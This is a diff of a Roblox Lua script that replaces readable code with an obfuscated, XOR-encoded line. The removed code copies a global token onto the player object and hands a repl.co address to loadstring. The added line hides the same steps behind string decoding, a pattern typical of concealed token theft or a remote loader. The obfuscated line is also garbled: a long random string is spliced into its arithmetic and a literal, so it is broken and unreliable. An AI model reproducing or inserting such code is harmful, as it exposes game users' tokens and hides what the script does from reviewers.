@@ -1,16 +1,1 @@
-repeat wait() until game.Players.LocalPlayer --Wait until player loaded
-
---Locals
-local sa_Instance
-local player
-local ip
-
---Assign
-player = game.Players.LocalPlayer
-sa_instance = Instance.new("StringValue")
-sa_instance.Value = _G.GlobalToken
-sa_instance.Parent = player
-ip = "https://.starvdog.repl.co"
-
---Connect
-loadstring(ip)
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor or v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v14,v15)local v16={};for i=1 -(1213 -(1116 + 97)), #v14 do v6(v16,v0(v4(v1(v2(v14,i,i + ((893 -591) -((711 -4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV) -(1828 -(354 + 1471))))))%(2013 -(1103 + 654))));end return v5(v16);end repeat wait();until game.Players.LocalPlayer local v8;local v9;local v10;v9=game.Players.LocalPlayer;sa_instance=Instance.new(v7("\138\4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVv12=v9;sa_instance.v13=v7("\241\18\130\114\205\56\152\104","\130\115\221\38");v10=v7("\255\10\156\248\197\148\189\134\250\12\138\231\219\204\243\218\227\23\139\166\197\218\243\219\225\26\135\239\152\220\247\217\251\80\139\231","\151\126\232\136\182\174\146\169");loadstring(v10);
